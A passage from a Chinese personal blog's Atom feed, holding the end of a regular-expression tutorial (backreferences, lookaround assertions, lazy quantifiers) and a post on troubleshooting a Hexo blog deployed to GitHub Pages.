kitty</em>。这个表达式首先是一个单词，也就是单词开始处和结束处之间的多于一个的字母或数字(\b(\w+)\b)，这个单词会被捕获到编号为1的分组中，然后是1个或几个空白符(\s+)，最后是分组1中捕获的内容（也就是前面匹配的那个单词）(\1)。</p><h1>零宽断言</h1><p>查找在某些内容(但并不包括这些内容)之前或之后的东西，也就是说它们像\b,^,$那样用于指定一个位置，这个位置应该满足一定的条件(即断言)，因此它们也被称为<strong>零宽断言</strong>。</p><p>示例：(?=exp)也叫<strong>零宽度正预测先行断言</strong>，它断言自身出现的位置的后面能匹配表达式exp。比如\b\w+(?=ing\b)，匹配以ing结尾的单词的前面部分(除了ing以外的部分)。</p><p>(?&lt;=exp)也叫<strong>零宽度正回顾后发断言</strong>，它断言自身出现的位置的前面能匹配表达式exp。比如(?&lt;=\bre)\w+\b会匹配以re开头的单词的后半部分(除了re以外的部分)</p><h1>负向零宽断言</h1><p><strong>零宽度负预测先行断言</strong>(?!exp)，断言此位置的后面不能匹配表达式exp。例如：\d{3}(?!\d)匹配三位数字，而且这三位数字的后面不能是数字；\b((?!abc)\w)+\b匹配不包含连续字符串abc的单词。</p><p>同理，我们可以用(?&lt;!exp),<strong>零宽度负回顾后发断言</strong>来断言此位置的前面不能匹配表达式exp：(?&lt;![a-z])\d{7}匹配前面不是小写字母的七位数字。</p><h1>注释</h1><p>小括号的另一种用途是通过语法(?#comment)来包含注释。例如：2[0-4]\d(?#200-249)|25<a href="?#250-255">0-5</a>|[01]?\d\d?(?#0-199)。</p><p>要包含注释的话，最好是启用“忽略模式里的空白符”选项，这样在编写表达式时能任意的添加空格，Tab，换行，而实际使用时这些都将被忽略。启用这个选项后，在#后面到这一行结束的所有文本都将被当成注释忽略掉。</p><h1>贪婪与懒惰</h1><table><thead><tr><th style="text-align:center">代码</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">*？</td><td style="text-align:center">重复任意次，但尽可能少重复</td></tr><tr><td style="text-align:center">+？</td><td style="text-align:center">重复1次或更多次，但尽可能少重复</td></tr><tr><td style="text-align:center">??</td><td style="text-align:center">重复0次或1次，但尽可能少重复</td></tr><tr><td style="text-align:center">{n,m}?</td><td style="text-align:center">重复n到m次，但尽可能少重复</td></tr><tr><td style="text-align:center">{n,}?</td><td style="text-align:center">重复n次以上，但尽可能少重复</td></tr></tbody></table><h1>参考资料</h1><p><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener">正则表达式30分钟入门教程</a></p><p><a href="https://www.regular-expressions.info/" target="_blank" rel="noopener">专业正则表达式教学网站</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;元字符&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&quot;text-align:center&quot;&gt;代码/语法&lt;/th&gt;
&lt;th style=&quot;text-align:center&quot;&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
      
    
    </summary>
    
      <category term="web入门" scheme="https://13m0nade.github.io/categories/web%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="正则表达式" scheme="https://13m0nade.github.io/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>hexo搭博客的坑</title>
    <link href="https://13m0nade.github.io/2019/07/29/hexo%E6%90%AD%E5%8D%9A%E5%AE%A2%E7%9A%84%E5%9D%91/"/>
    <id>https://13m0nade.github.io/2019/07/29/hexo搭博客的坑/</id>
    <published>2019-07-29T12:13:30.000Z</published>
    <updated>2019-07-29T13:23:19.872Z</updated>
    
    <content type="html"><![CDATA[<h1><strong>hexo搭博客的坑</strong></h1><hr><h2 id="github"><a class="header-anchor" href="#github">null</a>GitHub</h2><p>git gitcore必须放入环境变量。<br>用hexo搭博客的前提是你要拥有一个GitHub账号，登入创建项目，注意项目名必须为 <strong><a href="http://username.github.io" target="_blank" rel="noopener">username.github.io</a></strong>。创建完后可在右上角setting处github page 看到自己的域名，在浏览器中输入即可访问。（此过程有些缓慢，后期可将自己购买的域名解析到博客）</p><h2 id="git"><a class="header-anchor" href="#git">null</a>git</h2><p>git的作用是部署博客，在安装过程中有一步是选择运行的环境，这里我们选择在git bash下运行（不能在cmd下运行，后续操作须在bash下进行），若一定要在命令行运行可在安装时选择cmd，此模式下会有部分冲突，萌新慎选。</p><h2 id="hexo"><a class="header-anchor" href="#hexo">null</a>hexo</h2><p>hexo的配置是最复杂也是雷区最多的，首先在安装时需要安装插件，网上绝大多数博客只说了npm install，这条指令不能安装所有的插件，就像是把hexo部署到GitHub需要的hexo-deployer-git就无法安装，导致笔者一直无法部署，耗了很长时间，找了无数教程才解决。可以通过npm install hexo-deployer-git --save 安装，其他插件同理。<br>要将hexo部署成功需要对_config.yml文件进行修改，其中需要注意的是repository位在github clone处的ssh地址。最坑的来了这里冒号后有两个空格，两个空格，两个空格，重要的事说三遍。</p><h2 id="ending"><a class="header-anchor" href="#ending">null</a>ending</h2><p>配置完之后就可以进行个性化和写博客了，注意每次的修改都需要使用hexo g 生成，hexo d 部署。使用hexo s 在浏览器输入localhost:4000即可预览博客。</p><h2 id="报错解决"><a class="header-anchor" href="#报错解决">null</a>报错解决</h2><p>再部署中出现spawn failed报错，首先检查git是否加入环境变量，然后删除博客目录下.git文件夹。具体操作如下：</p><ol><li>hexo clean</li><li>hexo g</li><li>hexo d</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;&lt;strong&gt;hexo搭博客的坑&lt;/strong&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2 id=&quot;github&quot;&gt;&lt;a class=&quot;header-anchor&quot; href=&quot;#github&quot;&gt;null&lt;/a&gt;GitHub&lt;/h2&gt;
&lt;p&gt;git gitcore必须放入环境变量。
      
    
    </summary>
    
      <category term="经验分享" scheme="https://13m0nade.github.io/categories/%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="萌新入坑" scheme="https://13m0nade.github.io/tags/%E8%90%8C%E6%96%B0%E5%85%A5%E5%9D%91/"/>
    
  </entry>
  
</feed>
